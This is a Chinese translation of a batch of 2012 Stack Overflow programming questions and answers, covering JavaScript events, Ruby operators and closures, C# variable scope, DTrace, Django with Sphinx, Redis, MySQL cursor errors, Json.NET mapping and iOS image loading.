# javascript - Image.onload 对 IE 根本不起作用

> ID：11583061
> 
> 赞同：1
> 
> 时间：2012-07-20T16:06:48.373
> 
> 标签：javascript

```
var icon1 = new Image();
var wid1;
var hei1;
icon1.src = resource;                   // resource is Image URL here
icon1.onload = function () {
    wid1 = icon1.width;
    hei1 = icon1.height;
    var rati = wid1 / hei1;
}; 
```

这段代码是计算宽高比来进一步保持图像的纵横比，但在 IE 上根本不起作用。还有什么我可以用来维持适用于所有浏览器的图像纵横比的吗？

# ruby - ||= 是什么意思？

> ID：11583065
> 
> 赞同：16
> 
> 时间：2012-07-20T16:06:57.323
> 
> 标签：ruby

> **可能重复：**
> [||=（或等于）在 Ruby 中是什么意思？](https://stackoverflow.com/questions/995593/what-does-or-equals-mean-in-ruby)
> [||= 是什么意思？](https://stackoverflow.com/questions/7556902/what-does-mean)

我刚开始学习 RubyMotion，在很多例子中我都看到了它的`||=`语法。这是什么意思？

这是一个例子：

```
def window
  @window ||= begin
    w = UIWindow.alloc.initWithFrame UIScreen.mainScreen.bounds
    w.rootViewController = @navigationController
    w
end 
```

很难搜索符号，谷歌忽略了我查询中的符号。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-07-20T16:10:14.247

它是一个赋值运算符，意思是：或将此值分配给一个变量。

所以如果你做了这样`x ||= y`的事情`x || x = y`，那么如果 x 为 nil 或 false，则将 x 设置为 y 的值。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T16:13:13.403

此运算符仅在变量为 false 或 Nil 时设置变量。

# c# - C#初始化局部变量一次

> ID：11583068
> 
> 赞同：5
> 
> 时间：2012-07-20T16:07:08.153
> 
> 标签：c#, initialization

我认为我的问题将是完全愚蠢的，但我必须知道答案。

在这种情况下是否可以只初始化一次变量？

```
 static void Main()
    {
        while (true)
        {
            MethodA();
            MethodB();
        }
    }

    private static void MethodA()
    {
        string dots = string.Empty;    // This should be done only once

        if (dots != "...")
            dots += ".";
        else
            dots = string.Empty;

        Console.WriteLine(dots + "\t" + "Method A");
        System.Threading.Thread.Sleep(500);
    }

    private static void MethodB()
    {
        string dots = string.Empty;    // This should be done only once

        if (dots != ".....")
            dots += ". ";
        else
            dots = string.Empty;

        Console.WriteLine(dots + "\t" + "Method B");
        System.Threading.Thread.Sleep(500);
    } 
```

当然，我可以用方法初始化字符串点，但我不想在代码中弄乱，这也不能在任何其他循环中完成（比如 for）。有什么想法可以解决这个问题，还是我很愚蠢，无法正常思考？

提前致谢。

编辑：我已将示例代码更改为更实用。期望的输出应该是：

```
.    Method A
.    Method B
..   Method A
..   Method B
...  Method A
...  Method B
     Method A
.... Method B
.    Method A
.....Method B 
```

等等等等。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:09:38.127

您可以保留`dots`在您的班级中，并在创建班级时对其进行初始化，即

```
string dots = string.Empty; 
private void Method()
{
    if (dots != "...")
        dots += ".";
    else
        dots = string.Empty;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T16:22:14.990

您说您不想将点保留在 Method 之外（在 Method 的类中），那么您必须从 Method 返回值，以便您至少可以稍后将其传递，从而保持其状态。

```
string Method(string dot = string.Empty)
{
   if(dot == "...") return string.Empty;
   else return dot + ".";
}

var result = Method(Method(Method(Method(Method(Method()))))) // etc... 
```

编辑：您编辑的问题不会使您的初始问题更实用。它仍然存在同样的问题：您想要 X，但 C# 没有 X。请改用 C++ 或 VB.NET。

你的问题的答案

> “在这种情况下是否可以只初始化一次变量？”

很**抱歉，不！**

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-20T16:33:36.287

在其他语言 (C++) 中，您可以在任何范围内声明静态变量。这将巧妙地解决您的问题，但 C# 不允许在函数中声明静态变量。这实际上是一个 C# FAQ：[为什么 C# 不支持静态方法变量？](http://blogs.msdn.com/b/csharpfaq/archive/2004/05/11/why-doesn-t-c-support-static-method-variables.aspx).

这种设计特点意味着您无法以传统方法做您想做的事。你也许可以用柯里化做一些特别狡猾的事情，但如果你不想弄乱现有的程序结构，那就不行了。我敢肯定，有一种方法可以编写本机代码，让你得到你想要的，但这感觉是个坏主意。

简而言之，您要求的是在其范围之外持续存在的数据。在 C# 中，您的主要（唯一？）补救措施是增加该数据的范围。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T16:10:58.153

您正在寻找方法调用之间的持久数据，因此您需要调用之外的数据元素。C# 中没有静态局部变量。

考虑阅读[这篇 Stackoverflow 帖子。](https://stackoverflow.com/questions/1049689/why-doesnt-c-sharp-support-local-static-variables-like-c-does)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-20T16:27:58.510

您是否在考虑[C++ 中的静态局部变量](http://msdn.microsoft.com/en-us/library/s1sb61xd.aspx)？C# 不支持它们，如此[处](https://stackoverflow.com/questions/1049689/why-doesnt-c-sharp-support-local-static-variables-like-c-does)所述。

# dtrace - DTrace - 如何在返回探针中正确检索初始参数

> ID：11583072
> 
> 赞同：0
> 
> 时间：2012-07-20T16:07:21.933
> 
> 标签：dtrace

我正在尝试读取在我的返回探针中传递给函数的初始参数。与入口探针不同，返回探针中的参数变量( `arg0`, `arg1`,...) 不包含初始参数，我不确定如何检索这些值。

另外，由于并发问题，我想避免将值存储在全局变量中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T15:04:08.983

您可以将参数保存在线程本地存储中，例如

```
pid$target:foo:bar:entry
{
    self->arg0 = arg0;
    self->arg1 = arg1;
    /*
     * Avoid the race in which dtrace(1) attaches to the victim during
     * the window between the two probes.
     */
    self->trace = 1;
}

pid$target:foo:bar:return
/self->trace/
{
    printf("arg0 = 0x%x, arg1 = 0x%x\n", self->arg0, self->arg1);
    /* Deallocate the thread-local storage. */
    self->arg0 = 0;
    self->arg1 = 0;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-27T21:47:36.613

正如 rmh 回答的那样 - 使用局部变量是这样做的方法。否则，dtrace 将不得不在输入时为您保存值 - 它对传入的参数或您的期望一无所知，并且必须进行垃圾收集。（从技术上讲，它确实知道会发生什么 - 最终 - 但与映射到一组简单虚拟 D 指令的局部变量方法相比，这会增加复杂的开销）。

# javascript - javascript onDOMContentLoaded 不会触发

> ID：11583074
> 
> 赞同：8
> 
> 时间：2012-07-20T16:07:24.983
> 
> 标签：javascript, html

任何想法为什么这段代码不起作用？

```
<html><head>
    <script type="text/javascript">
        document.onDOMContentLoaded=function(){
            alert('aaaaaaaaaaaaaa');
        }
    </script>
    </head>
    <body>
        <div id="mydiv"></div>
    </body>
</html> 
```

onDOMContentLoaded 预计会在网页加载时触发并发出警报，但它不起作用不知道为什么

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-07-20T16:12:15.667

您应该通过以下方式绑定到事件`addEventListener`：

```
document.addEventListener("DOMContentLoaded", function() {
    alert('aaaaaaaaaaaaaa');
}); 
```

[http://jsfiddle.net/qHa4T/1](http://jsfiddle.net/qHa4T/1)

请记住，两者`addEventListener`都`DOMContentLoaded`不能与 IE8 及以下版本一起使用。

# django - Sphinx Docs 未导入 Django 项目设置

> ID：11583075
> 
> 赞同：2
> 
> 时间：2012-07-20T16:07:31.967
> 
> 标签：django, python-sphinx

我最近刚刚将一个 Django 项目移动到一个新的 virtualenv 中。该项目运行良好，但我无法构建我的 Sphinx 文档。

在我的 conf.py 我有这个：

```
import sys, os

sys.path.append('/path/to/myproject')

from django.core.management import setup_environ
from myproject import settings

setup_environ(settings) 
```

但是当我使用`make html`我得到这个错误：

```
from myproject import settings
  ImportError: No module named myproject 
```

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T17:21:10.620

原来 conf.py 需要看起来像这样：

```
import sys, os

sys.path.append('/path/to')

from myproject import settings
from django.core.management import setup_environ
setup_environ(settings) 
```

希望这可能对某人有所帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-07-28T21:31:29.580

Django 1.4 已弃用`setup_environ`。以下是 Django 1.4 及更高版本的类似代码：

```
import sys, os
cwd = os.getcwd()
parent = os.path.dirname(cwd)
sys.path.append(parent)
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "myproject.settings") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-05-28T19:50:57.397

在 Django 1.7.5 项目中遇到这个问题，我认为这取决于我们做出的一些奇怪的项目布局决定，但我需要一个额外的步骤来使用 jwhitlock 的回答来解决这个问题：

```
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "myproject.settings")
from django.conf import settings 
```

当我进行那个无用的导入时，它发现了我的自定义 Django 设置，这些设置`DJANGO_SETTINGS_MODULE`在 autodoc 过程中指定但没有找到。我认为这是因为该项目位于其父级具有相同名称的文件夹中，但检查`sys.path`仅显示“正确”文件夹，因此导入应该可以工作，但会说它找不到我的设置。

# c# - ServiceStack Redis 如何在检索数据时发挥作用

> ID：11583080
> 
> 赞同：1
> 
> 时间：2012-07-20T16:07:50.883
> 
> 标签：c#, redis, servicestack

不确定这是否是该问题的最佳标题......也许有人可以为我重命名它？

我的问题是关于在 Redis 的 c# ServiceStack 包装器中读取和组合数据的性能以及调用在内部如何工作。

我将解释两种有望产生最终结果的情景。一种情况是将类别 ID 列表附加到事务，以便可以独立存储类别。

**问题**：我的最终目标是检索所有具有“食物”类别的交易。

我试图对其他有助于我理解的要点进行编号。考虑有 10,000 笔交易，每笔交易平均有 3 个类别。

**注意：** ServiceStack.Net Redis中有一个相关问题[：Storing Related Objects vs. Related Object Ids](https://stackoverflow.com/questions/8914349/servicestack-net-redis-storing-related-objects-vs-related-object-ids?rq=1)但是没有解释效率。

**示例 A**

```
public class Transaction
{
    public List<string> CategoryIds;
} 
```

**示例 B**

```
public class Transaction
{
    public List<string> CategoryNames;
} 
```

**代码**

```
var transactionClient = redisClient.GetTypedClient<Transaction>();

//1\. is this inefficient returning all transactions?
//   is there any filtering available at this part?
var allTransactions = transactionClient.GetAll();

//2\. In the case of Example A where the categories are stored as id's
//   how would I map the categories to a transaction?
//   maybe I have a List that has a container with the Transaction associated with a
//   list of Categories, however this seems inefficient as I would have to loop 
//   through all transactions make a call to get their Categories and then 
//   populate the container datatype.

//3\. If we are taking Example B how can I efficiently just retrieve the transactions
//   where they have a category of food. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:35:14.247

效率是**更少的网络调用**与**更多的数据**。Redis 中的数据只是变得模糊不清，大多数情况下，单个 API 调用会 1:1 映射到 redis 服务器操作。这意味着您可以将性能影响视为简单地从远程服务器的内存中下载一个 json 数据集 blob 并在客户端上对其进行反序列化——这实际上就是所有发生的事情。

在某些 API（如[GetAll()）](https://github.com/ServiceStack/ServiceStack.Redis/blob/master/src/ServiceStack.Redis/Generic/RedisTypedClient.cs#L388)中，它需要 2 次调用，1 次获取实体集中的所有 id，另一个获取具有这些 id 的所有记录。[Redis 客户端](https://github.com/ServiceStack/ServiceStack.Redis/tree/master/src/ServiceStack.Redis)的源代码非常容易理解，因此我建议您查看一下到底发生了什么。

因为您只有 3 个类别，所以通过尝试在服务器上进行过滤并没有节省多少额外数据。

所以你的选择基本上是：

*   下载整个实体数据集并在客户端过滤
*   从 Category > Ids 维护自定义索引映射
*   更高级：使用服务器端 LUA 操作来应用服务器端过滤（需要 Redis 2.6）

# python - Python Mysql，“命令不同步；您现在无法运行此命令”

> ID：11583083
> 
> 赞同：43
> 
> 时间：2012-07-20T16:07:57.113
> 
> 标签：python, mysql

我有一个从 Python 执行的 MySQL 存储过程（包装在 Django 中）。当我尝试执行第二条语句时，出现错误“命令不同步；您现在无法运行此命令”。此时我无法提交交易。这只是我调用过程时的问题。该怎么办？

```
cursor.callproc('my_mysql_procedure', [some_id,]) 
result = cursor.fetchall()
for r in result:
    do something

cursor.execute("select * from some_table")
result = cursor.fetchall() 
```

编辑：我被要求发布 MySQL 程序。我让它变得超级简单，但我仍然看到同样的问题

```
delimiter $$
create procedure my_mysql_procedure(p_page_id int)
    begin

        select 1
        from dual; 

    end$$
delimiter ; 
```

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2012-07-21T07:21:40.983

感谢 JoshuaBoshi 的回答，解决了这个问题。调用该过程后，我必须关闭游标并再次打开它，然后才能使用它执行另一条语句：

```
cursor.close() 

cursor = connection.cursor() 
```

之后可以立即关闭游标`fetchall()`。结果集仍然存在并且可以循环通过。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2013-09-04T15:48:07.153

造成这种情况的主要原因是在进行新查询之前未从游标中获取结果。可能有多个结果集。

要停止错误，您必须确保每次使用 .nextset 使用结果集。如果它产生多个结果集——你甚至可能需要做一些。

```
cursor.callproc('my_mysql_procedure', [some_id,]) 
result = cursor.fetchall()
for r in result:
    do something
cursor.nextset()
cursor.execute("select * from some_table")
result = cursor.fetchall() 
```

在我的情况下，我发现这实际上可以表明 sql 查询中的其他问题，这些问题在进行后续查询之前不会被选为 python 错误。他们产生了多个结果集。

将此应用于下面的示例（我看到相同的错误），

```
>>> import MySQLdb
>>> conn = MySQLdb.connect(passwd="root", db="test")
>>> cur = conn.cursor()
>>> cur.execute("insert into foo values (1););")
1L
>>> cur.nextset()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/dist-packages/MySQLdb/cursors.py", line 107, in nextset
    nr = db.next_result()
_mysql_exceptions.ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')' at line 1 
```

这里 - 因为解析错误（一些受信任的输入数据，被代码修改）导致该分号，然后是一个新语句 - 这产生了多个结果集。它不会对这条语句产生错误，但对于下一个试图在游标上运行命令的语句。

我制作了一个 github repo - [https://github.com/odmsolutions/mysql_python_out_of_sync_demo](https://github.com/odmsolutions/mysql_python_out_of_sync_demo) - 来演示和测试这一点。

* * *

原始答案：查看[https://github.com/farcepest/MySQLdb1/issues/28](https://github.com/farcepest/MySQLdb1/issues/28)，了解我如何能够通过 3 行代码可靠地重现此问题的详细信息：

重现这个的最小情况：（假设你有一个空白数据库，并且只创建了一个到数据库的连接，称为 conn）

```
>>> conn.query("Create table foo(bar int(11))")
>>> conn.query("insert into foo values (1););")
>>> conn.query("insert into foo values (2););")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
_mysql_exceptions.ProgrammingError: (2014, "Commands out of sync; you can't run this command now") 
```

这是生成的错误语法，从错误中我无法判断这是问题所在。

尝试按照 Bukzor 的建议检查最后一个查询或过程 - 并尝试在原始 mysql 客户端中运行它以查看真正的问题。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-20T16:17:50.730

这不是python问题，而是mysql问题。从 perl 做同样的事情，你会得到同样的错误。通常，我在运行 mysql 控制台时看到该消息，然后从另一个控制台将其终止，然后尝试从终​​止的控制台运行查询。

有些东西正在扼杀你陈述之间的联系。这可能是您的程序中的错误。检查你的mysql错误日志。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-02-27T00:33:07.250

我在运行以下 Python (2.7) 代码时遇到了这个错误：

```
 def _execute(self, query, params, is_destructive):
try:
  cursor = self.con.cursor()
  cursor.execute(query, params)
  if is_destructive:
    self.con.commit()
  return cursor.fetchall()
finally:
  cursor.close() 
```

问题源于 self.con.commit() 调用。我们是防御性的，并且在关闭游标之前进行了破坏性（写入）操作的编码。MySql 不喜欢这样。删除调用的 commit() 解决了问题，脚本仍然通过 cursor.fetchall() 执行

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-03-05T22:44:41.393

由于我现在已经用谷歌搜索了几次，登陆了同一个 SO 问题（这里），并且没有一个答案是有帮助的，这里是我未来的建议：

此错误是 MySQL 未获取响应的来源。也就是说，我们发送了请求，得到了一些东西，但并不关心阅读它。

```
req = "UPDATE data SET h1='qwertyuioasdasdasda' WHERE id=1;commit;" 
```

就我而言，删除后`commit`我能够看到此错误：

```
Warning: (1265L, "Data truncated for column 'h1' at row 1") 
```

之所以提出它是因为我试图写`h1`的数据类型太长了。但是，`commit`阻止我取回这些信息。

# javascript - Ruby 作用域，从函数返回 Proc

> ID：11583085
> 
> 赞同：4
> 
> 时间：2012-07-20T16:07:58.540
> 
> 标签：javascript, ruby, scope, proc

来自 JavaScript 背景，我已经习惯于使用 JavaScript 的动态范围将值封装在函数中。例如：

```
function Dog( firstname, lastname ) {

  this.fullname = firstname + lastname

  return {
    say_name: function () {
      return fullname;
    }
  }

} 
```

现在在 Ruby 中，我不太确定这样的事情是否会很好地工作：

```
class Foo

  attr_accessor :bar, :baz

  def initialize bar, baz
    @bar = bar
    @baz = baz
  end

  def give_me_a_proc
    return Proc.new { @bar + @baz }
  end
end 
```

任何人都可以快速解释范围在 Ruby 中的工作原理吗？如果我调用从返回的 Proc `give_me_a_proc`，它是否仍然可以访问其定义时间范围？

一旦我定义了proc，这些值是否会变得固定，或者`Foo`即使在定义proc之后，所做的任何更改也会传递到Proc？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T16:35:44.630

是的，它仍然可以访问定义时间范围。请参阅[Proc 类的文档](http://www.ruby-doc.org/core-1.9.3/Proc.html)。

更改将向下传递到 Proc 后定义。irb 的结果与您的班级一起运行。

```
> foo = Foo.new(1, 2)
 => #<Foo:0x007f9002167080 @bar=1, @baz=2> 
> quux = foo.give_me_a_proc
 => #<Proc:0x007f900214f688@(irb):11> 
> quux.call
 => 3 
> foo.bar = 3
 => 3 
> quux.call
 => 5 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T16:42:24.890

在 Ruby 中，proc 是一个闭包。在 Javascript 中，函数是一个闭包。闭包的想法是它“关闭”了定义它的环境。在 Ruby 中，proc 中的变量仍然可以更改，即使是在 proc 之外的代码，新值将反映在 proc 中（参见 peakxu 演示）。不确定 Javascript 闭包是否以这种方式工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-20T16:55:51.220

Ruby procs 和 lambdas 是闭包。当您这样做时，`return Proc.new { @bar + @baz }`您实际上是在捕获`self`，这就是查找实例变量的方式。Ruby 块也是闭包。Ruby 确实允许您更改变量，并且更改将传播到调用范围，假设调用范围仍然存在：

```
@hi = 0
def get_hi()
  lambda {@hi = 42}
end
get_hi.call()
@hi #=> 42 
```

注意：除非你的 proc 有非常宽松的参数要求（它不关心它是否有任何参数，有多少，有点像 C 的`int f(void)`），使用`lambda`而不是`Proc.new`. `lambda`检查以确保您获得正确数量的参数。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T17:22:36.543

Ruby 有一种从对象获取闭包的方法，它非常适合您的示例：

```
class Foo
  # reopen Foo class
  def get_sum
    @bar + @baz
  end
end

m = Foo.new(5,20).method(:get_sum)
m.call #=> 25 
```

是对象，它充当' 实例中的闭包，因此实例变量和 ' 的值`m`仍然可用。`Method``Foo``self`

# python - Python：将 sys.argv 与字符串进行比较

> ID：11583091
> 
> 赞同：0
> 
> 时间：2012-07-20T16:08:38.410
> 
> 标签：python

这似乎应该很简单，但我遇到了一些严重的问题。我要做的就是查看用户输入是否与 2 个字母的表达式匹配。我想我最大的问题是我对 re 库不是很熟悉，并且文档并没有真正帮助我太多。

这是我到目前为止所尝试的：

试试 1

```
if re.match(sys.argv[3],  "GL",  re.I):
    input_file_path = "V:\\test" 
```

试试 2

```
if re.ignorecase(sys.argv[3],  "GL"):
    input_file_path = "V:\\test" 
```

试试 3

```
if sys.argv[3] == "GL":
    input_file_path = "V:\\test" 
```

我调用程序运行的方式：filename.py tester test GL "tester" 和 "test" 还没有真正使用。

编辑：我发现了我的主要问题。我正在调用一堆 if 语句而不是 elif。所以最后一个说 else：exit() 总是被击中（因为我正在测试第一个 if）。菜鸟错误

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-20T16:10:01.243

只需在比较之前将要测试的字符串转换为小写，就可以了：

```
if sys.argv[3].lower() == "gl":
    input_file_path = "V:\\test" 
```

更值得注意的是，正则表达式不是这项工作的正确工具。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:17:50.030

你的 re.match 是落后的。模式是第一位的。尝试：

```
if re.match('GL', sys.argv[3], re.I):
    input_file_path = "V:\\test" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:14:39.423

显然第三个参数不是'GL'。`print sys.argv`你会看到的。我的猜测是你的索引差了一个。

向我们展示您用于运行脚本的命令行。

* * *

> 打印 sys.argv[3] 准确地打印 GL –LiverpoolFTW

* * *

然后错误在其他地方。如果您`sys.argv[3].lower() == "gl"`在之前和`input_file_path`之后打印，您将看到预期值。你真正需要的是一个调试器。`pdb`是内置标准，但我强烈推荐`pudb`.

为了快速设置，请将这些粘贴到终端中。`virtualenv`是保持项目依赖关系分离的行业标准。

```
cd ~
wget https://raw.github.com/pypa/virtualenv/1.6.3/virtualenv.py
python virtualenv.py mypy
source mypy/bin/activate
pip install pudb 
```

`activate`只要您想进入环境，就可以获取该文件。运行`deactivate`（由 定义的别名`activate`）退出。确保在环境中使用python（即`#!/usr/bin/env python`）而不是硬编码特定的python 实例。

# android - 从 JSON 加载内容值

> ID：11583097
> 
> 赞同：0
> 
> 时间：2012-07-20T16:09:09.943
> 
> 标签：android, json

我正在尝试将内容值加载到数据库中。这里的代码有效：

```
private void processTable(final JsonReader tableReader, final ModelLoader loader) throws IOException
    {
        tableReader.beginArray();
        while (tableReader.hasNext()) {
            String id = loader.getIdColumnName();
            final ContentValues cv = loader.parseModel(tableReader);

            persistData(loader.getTableName(),id, cv);
        }
        tableReader.endArray();
    } 
```

但是，当我向其中添加其他部分时，它会失败。

```
private void processTable(final JsonReader tableReader, final ModelLoader loader) throws IOException
    {
        tableReader.beginArray();
        while (tableReader.hasNext()) {
            String id = loader.getIdColumnName();
            final ContentValues cv = loader.parseModel(tableReader);

            if (loader.getModelType() == Filter.LOADER.getModelType())                  //Checks to see if the filter sub arrays are there
            {
                while(tableReader.hasNext()) 
                {
                    String name = "";
                    try{
                        tableReader.
                        name = tableReader.nextName();
                    } catch (Exception e) {
                    tableReader.skipValue();
                    continue;
                    }
                    if (name.equals("ImageOverlays"))
                        processTable(tableReader, mLoader.getSpecificLoader("ImageOverlays"));
                    else if (name.equals("ColorOverlays"))
                        processTable(tableReader, mLoader.getSpecificLoader("ColorOverlays"));
                }
            }

            persistData(loader.getTableName(),id, cv);
        }
        tableReader.endArray();
    } 
```

附加代码的目的是从过滤器中获取特定项目，然后处理它们。当我使用这段代码时，我什至没有得到以前使用过的过滤器的任何值。

我认为我跳过这些值会以某种方式搞砸我在它之前声明的 ContentValues 简历。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:00:09.773

所以它的内部循环导致了跳过必须解析的 JSON 对象的问题......

是的，您在评论中提到的内容值在您到达循环结束时无效。

# sql - 从另外两个表插入第三个表

> ID：11583102
> 
> 赞同：0
> 
> 时间：2012-07-20T16:09:22.980
> 
> 标签：sql, sql-server-2008, tsql

所以我试图一次将一小批行（<10）插入一个表中。数据在一个表值参数中，但我需要在插入之前添加一些额外的列，这些列对所有行都是通用的。我尝试了两种方法：

```
INSERT INTO endTable
([col1],[col2],[commoncol1],[commoncol2])
SELECT
t.col1, t.col2, @CommonValue1, @CommonValue2
FROM startTable t 
```

我还尝试通过将公共变量放入临时表变量中，然后将其与 startTable 交叉连接，如下所示：

```
DECLARE @tempTable TABLE([temp1],[temp2])
INSERT INTO @tempTable(temp1,temp2) VALUES (@CommonValue1, @CommonValue2)

INSERT INTO endTable
([col1],[col2],[commoncol1],[commoncol2])
SELECT
a.col1, a.col2, b.temp1, b.temp2
FROM startTable a CROSS JOIN @tempTable b 
```

当且仅当 startTable 有多行时，这两种尝试都会给出相同的错误：

> 子查询返回超过 1 个值。当子查询跟随 =、!=、<、<=、>、>= 或子查询用作表达式时，这是不允许的。

我希望在不诉诸循环的情况下完成这些插入，但我对 SQL 并不是非常熟悉，所以我不知道我是否不走运，或者我是否遗漏了一些明显的东西。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:22:28.797

由于您的`INSERT`语句没有子查询，因此错误消息没有意义。我的猜测是你有一个引发`endTable`错误的触发器。

运行以下查询以查看是否有任何触发器`endTable`。如果这样做，那么您将需要检查触发器中的 SQL 以了解它抛出错误的原因。

```
SELECT * 
FROM sys.triggers 
WHERE parent_id = OBJECT_ID(N'endTable') 
```

# c# - 使用 JSon.net 将平面 JSON 数据反序列化为结构

> ID：11583107
> 
> 赞同：4
> 
> 时间：2012-07-20T16:09:47.573
> 
> 标签：c#, .net, json.net

我正在使用一个返回 JSON 数据的 Web 服务，并且在许多情况下，这些服务会在一个对象中返回多个属性，我想将这些属性分组到 C# 端的一个类中。考虑一个类结构，如：

```
 class Person
  {
      public Address Address { get; set; }
      public string Name {  get; set; }
  }

  class Address
  {
      public string StreetAddress { get; set; }
      public string City {  get; set; }
      public string ZipCode {  get; set; }
  } 
```

JSON数据如下：

```
{ "Name" : "Pilchie",
"StreetAddress" : "1234 Random St",
"City" : "Nowheretown",
"Zip" : "12345"
} 
```

是否可以将 my`Person`和`Address`classes 属性化，以便它们序列化/反序列化为这种格式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T17:04:22.433

我不认为您可以让 JSON.NET 一次性完成所有工作——您必须手动创建 Person 对象。但是，您可以在不创建单独的 DTO 类的情况下做到这一点。例如：

```
var jsonText = "{ \"Name\" : \"Pilchie\"," +
            "\"StreetAddress\" : \"1234 Random St\"," +
            "\"City\" : \"Nowheretown\"," +
            "\"Zip\" : \"12345\"" +
            "}";
JObject jsonObject = (JObject) JsonConvert.DeserializeObject(jsonText);

var person =
    new Person
    {
        Address = new Address
                    {
                    City = (String) jsonObject["City"],
                    StreetAddress = (String) jsonObject["StreetAddress"],
                    ZipCode = (string) jsonObject["Zip"]
                    },
        Name = (string) jsonObject["Name"]
    }; 
```

并序列化：

```
JsonConvert.SerializeObject(
    new
    {
        person.Name,
        person.Address.StreetAddress,
        person.Address.City,
        Zip = person.Address.ZipCode
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:15:17.453

我认为反序列化您正在使用的数据的最简单方法是创建一个与 JSON 数据格式匹配的简单 DTO 对象。然后，您可以使用 AutoMapper 或类似的库轻松地将数据映射到新结构。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:09:49.440

```
var person = JsonConvert.DeserializeObject<Person>(json);

class Person
{
    [JsonProperty("StreetAddress")]
    private string _StreetAddress { get; set; }

    [JsonProperty("City")]
    private string _City { get; set; }

    [JsonProperty("Zip")]
    private string _ZipCode { get; set; }

    public string Name { get; set; }

    public Address Address
    {
        get
        {
            return new Address() { City = _City, StreetAddress = _StreetAddress, ZipCode = _ZipCode };
        }
    }
}

class Address
{
    public string StreetAddress { get; set; }
    public string City { get; set; }
    public string ZipCode { get; set; }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:30:28.350

这完全取决于您将如何使用这些数据。如果您只想访问地址属性，则可以执行以下操作：

```
class Person
{
    public string Name { get; set; }
    public string StreetAddress { get; set; }
    public string City { get; set; }
    public string ZipCode { get; set; }

    [ScriptIgnore]
    public Address Address { get {return new Address(){StreetAddress = this.StreetAddress,
                                                       City = this.City,
                                                       ZipCode = this.ZipCode} } }
} 
```

# ios - UITableView 中多张图片的延迟加载

> ID：11583108
> 
> 赞同：1
> 
> 时间：2012-07-20T16:09:50.823
> 
> 标签：ios, uitableview, uiimageview

下载多个图像并将每个图像加载到 UITableViewCell 内的 UIImageView 的最佳实践是什么？特别是，我应该在下载后调整/替换 UIImageview 的大小，还是应该调整图像的大小以适应 UIImageView。请注意，调整/替换 UIImageView 也会调整/替换 UITableViewCell。它会引起任何问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T17:17:52.457

几个想法：

> 下载多个图像并将每个图像加载到 a 中的最佳实践`UIImageView`是`UITableViewCell`什么？

关于下载图像的最佳实践包括：

1.  绝对利用延迟加载（根据需要而不是之前加载图像）。

2.  异步下载图像。

3.  确保您的下载技术将取消对不再可见的 tableview 单元格的请求。例如，如果您的网络速度较慢并且在表格视图中快速向下滚动，您不想占用您的设备下载不再可见的图像。

4.  确保不要对服务器发出太多并发请求。在 iOS 中，当您超过 5 或 6 个并发请求时，后续请求将冻结，直到前面的请求完成。在最坏的情况下，后续请求实际上会因为超时而开始失败。

5.  缓存您的结果。至少，将它们缓存在内存中。您可能还希望将它们缓存到持久存储（也称为“磁盘”）。

如果您要为异步操作、缓存等编写自己的代码，您可能希望使用[`NSOperationQueue`](https://developer.apple.com/library/ios/#documentation/cocoa/Reference/NSOperationQueue_class/Reference/Reference.html)GCD 代替 GCD，以便我可以限制[后台请求的数量](https://developer.apple.com/library/ios/documentation/cocoa/Reference/NSOperationQueue_class/Reference/Reference.html#//apple_ref/occ/instm/NSOperationQueue/maxConcurrentOperationCount)并使请求[可取消](http://developer.apple.com/library/mac/documentation/Cocoa/Reference/NSOperation_class/Reference/Reference.html#//apple_ref/doc/uid/TP40004591-RH2-SW8)。您将使用[`NSCache`](https://developer.apple.com/library/ios/#documentation/cocoa/reference/NSCache_Class/Reference/Reference.html)缓存图像。而且您可能会使用`UITableViewCell`子类（或类别），以便您可以保存`weak`对“先前”操作的引用，以便您可以取消任何不完整的先前请求。

